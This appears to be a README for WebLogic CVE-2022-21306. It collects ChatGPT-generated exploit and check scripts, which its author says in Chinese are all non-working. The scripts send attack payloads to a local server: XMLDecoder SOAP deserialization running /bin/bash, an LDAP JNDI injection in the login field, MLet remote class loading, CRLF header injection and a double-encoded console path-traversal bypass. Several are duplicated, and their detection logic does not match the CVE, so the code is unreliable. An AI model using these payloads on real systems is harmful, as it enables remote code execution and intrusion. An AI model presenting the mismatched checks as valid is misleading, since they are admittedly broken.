# CVE-2022-21306
POC，EXP，chatGPT for me，只能给一些思路，全部不可用

## code
```
# import json
# import requests

# target_url = "http://127.0.0.1:7001"

# headers = {
#     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
#     'Content-Type': 'application/json',
#     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
#     'Referer': target_url,
#     'Connection': 'keep-alive',
#     "X-Requested-With": "XMLHttpRequest"
# }

# data = {
#     "name": {
#         "class": "javax.management.loading.MLet",
#         "ctor": [
#             {
#                 "type": "java.net.URL",
#                 "val": "http://127.0.0.1:9999/"
#             }
#         ],
#         "version": "1.0"
#     }
# }

# json_data = json.dumps(data)

# response = requests.post(target_url, headers=headers, data=json_data)

# if "Vulnerable" in response.text:
#     print("The website is vulnerable to CVE-2022-21306!")
# else:
#     print("The website is not vulnerable to CVE-2022-21306.")

# import requests

# target_url = "http://127.0.0.1:7001"

# headers = {
#     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
#     'Content-Type': 'application/x-www-form-urlencoded',
#     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
#     'Referer': target_url,
#     'Connection': 'keep-alive',
#     "X-Requested-With": "XMLHttpRequest\r\nContent-Length: 5\r\n\r\nwoohoo",
# }

# response = requests.post(target_url, headers=headers)

# if response.status_code == 200 and ("ClassNotFoundException" in response.text or "java.lang.ClassNotFoundException" in response.text):
#     print("The website is vulnerable to CVE-2022-21306!")
# else:
#     print("The website is not vulnerable to CVE-2022-21306.")

# import requests

# target_url = "http://127.0.0.1:7001/"
# payload = "a';JdbcDataSource.getDataSource(\"ldap://localhost:1389/Exploit\")//"
# headers = {
#     "Content-Type": "application/x-www-form-urlencoded",
#     "X-Requested-With": "XMLHttpRequest"
# }
# data = {
#     "j_username": payload,
#     "j_password": "1"
# }
# try:
#     response = requests.post(target_url + "j_security_check", data=data, headers=headers, timeout=3)
#     if "error-page" in response.text:
#         print("[+] Target is vulnerable to CVE-2022-21306")
#     else:
#         print("[-] Target is not vulnerable")
# except requests.exceptions.Timeout:
#     print("[-] Request timeout occurred. The target may be protected by a WAF")
# except requests.exceptions.RequestException as e:
#     print("[-] An error occurred: ", e)


# import requests

# # 目标URL
# target_url = "http://127.0.0.1:7001/console/css/%252e%252e%252fconsole.portal"

# # 请求头
# headers = {
#     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
#     "Content-Type": "application/x-www-form-urlencoded",
#     "Upgrade-Insecure-Requests": "1",
#     "X-Requested-With": "XMLHttpRequest"
# }

# # 发送请求
# response = requests.post(target_url, headers=headers)

# # 判断是否存在漏洞
# if "Welcome to WebLogic Server" in response.text:
#     print("目标存在Weblogic CVE-2022-21306漏洞！")
# else:
#     print("目标不存在Weblogic CVE-2022-21306漏洞。")


# import requests

# target_url = "http://127.0.0.1:7001/console/css/%252e%252e%252fconsole.portal"
# headers = {
#     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299",
#     "Content-Type": "text/xml"
# }

# payload = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\
#                <soapenv:Header>\
#                   <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\
#                      <java version=\"1.8.0_181\" class=\"java.beans.XMLDecoder\">\
#                         <void class=\"java.lang.Thread\" method=\"currentThread\">\
#                            <void method=\"setContextClassLoader\">\
#                               <java version=\"1.8.0_181\" class=\"java.beans.XMLDecoder\">\
#                                  <void class=\"java.lang.ClassLoader\" method=\"loadClass\">\
#                                     <string>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</string>\
#                                  </void>\
#                               </java>\
#                            </void>\
#                         </void>\
#                      </java>\
#                   </work:WorkContext>\
#                </soapenv:Header>\
#                <soapenv:Body/>\
#             </soapenv:Envelope>"

# response = requests.post(target_url, headers=headers, data=payload)

# if response.status_code == 500 and 'Error occurred while processing request' in response.text:
#     print("WebLogic Server is vulnerable to CVE-2022-21306")
# else:
#     print("WebLogic Server is not vulnerable to CVE-2022-21306")


# import requests
# import sys

# # 定义检测函数
# def check(url):
#     target_url = url + "/console/images/%252E%252E%252Fconsole.portal"
#     headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0",
#                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
#                "Accept-Language": "en-US,en;q=0.5",
#                "Accept-Encoding": "gzip, deflate",
#                "Referer": target_url,
#                "Connection": "close",
#                "Upgrade-Insecure-Requests": "1"}

#     try:
#         response = requests.get(target_url, headers=headers, timeout=10, verify=False)

#         if response.status_code == 200 and 'LoginPage.jsp' in response.text:
#             print(f"[+] {url} is vulnerable to CVE-2022-21306!")
#         else:
#             print(f"[-] {url} is not vulnerable.")
#     except Exception as e:
#         print(f"[-] {url} request failed: {e}")


# if __name__ == '__main__':

#     check("http://127.0.0.1:7001")


# import requests

# # 目标URL
# target_url = "http://127.0.0.1:7001/console/login/LoginForm.jsp"

# # 构造HTTP请求头
# headers = {
#     "Content-Type": "application/x-www-form-urlencoded",
#     "X-Requested-With": "XMLHttpRequest",
# }

# # 构造HTTP POST数据
# data = {
#     "j_username": "weblogic",
#     "j_password": "weblogic",
#     "j_character_encoding": "UTF-8",
# }

# # 发送HTTP POST请求
# response = requests.post(target_url, headers=headers, data=data)

# # 判断是否存在漏洞
# if "HTTP 404" in response.text:
#     print("目标服务器不受影响")
# else:
#     print("目标服务器受到CVE-2022-21306漏洞的影响")


# import requests

# target_url = "http://localhost:7001/wls-wsat/CoordinatorPortType"
# headers = {
#     "Content-Type": "text/xml;charset=UTF-8",
#     "SOAPAction": "",
#     "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36",
#     "Accept-Encoding": "gzip, deflate",
#     "Accept": "*/*",
#     "Connection": "keep-alive",
#     "Content-Length": "297"
# }

# data = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
# <soapenv:Header>
#     <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
#         <java version="1.8.0_241" class="java.beans.XMLDecoder">
#             <void class="java.lang.ProcessBuilder">
#                 <array class="java.lang.String" length="3">
#                     <void index="0">
#                         <string>/bin/bash</string>
#                     </void>
#                     <void index="1">
#                         <string>-c</string>
#                     </void>
#                     <void index="2">
#                         <string>echo "Vulnerable" &gt; /tmp/vuln.txt</string>
#                     </void>
#                 </array>
#                 <void method="start"/>
#             </void>
#         </java>
#     </work:WorkContext>
# </soapenv:Header>
# <soapenv:Body/>
# </soapenv:Envelope>
# '''

# response = requests.post(target_url, headers=headers, data=data)

# if response.status_code == 500 and "Vulnerable" in response.text:
#     print("目标存在 CVE-2022-21306 漏洞")
# else:
#     print("目标不存在 CVE-2022-21306 漏洞")


# import requests

# target_url = "http://127.0.0.1:7001/console/css/%252e%252e%252fconsole.portal"

# headers = {
#     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299",
#     "Content-Type": "application/x-www-form-urlencoded",
#     "X-Requested-With": "XMLHttpRequest"
# }

# data = "test"

# try:
#     response = requests.post(target_url, data=data, headers=headers, timeout=5)
#     if response.status_code == 500 and "javax.servlet.ServletException: java.io.IOException: error in creating zip file of the extracted content" in response.text:
#         print("[+] WebLogic is vulnerable to CVE-2022-21306")
#     else:
#         print("[-] WebLogic is not vulnerable to CVE-2022-21306")
# except Exception as e:
#     print("[-] Error occurred: " + str(e))


# import requests

# target_url = "http://127.0.0.1:7001/console/css/%252e%252e%252fconsole.portal"

# headers = {
#     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299",
#     "Content-Type": "application/x-www-form-urlencoded",
#     "X-Requested-With": "XMLHttpRequest"
# }

# data = "test"

# try:
#     response = requests.post(target_url, data=data, headers=headers, timeout=5)
#     if response.status_code == 500 and "javax.servlet.ServletException: java.io.IOException: error in creating zip file of the extracted content" in response.text:
#         print("[+] WebLogic is vulnerable to CVE-2022-21306")
#     else:
#         print("[-] WebLogic is not vulnerable to CVE-2022-21306")
# except Exception as e:
#     print("[-] Error occurred: " + str(e))


import requests

url = "http://127.0.0.1:7001/console/css/%252e%252e%252fconsole.portal"
payload = "test"
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest"
}

try:
    response = requests.post(url, data=payload, headers=headers, timeout=5)
    if response.status_code == 500 and "javax.servlet.ServletException: java.io.IOException: error in creating zip file of the extracted content" in response.text:
        print("[+] WebLogic is vulnerable to CVE-2022-21306")
    else:
        print("[-] WebLogic is not vulnerable to CVE-2022-21306")
except Exception as e:
    print("[-] Error occurred: " + str(e))

```
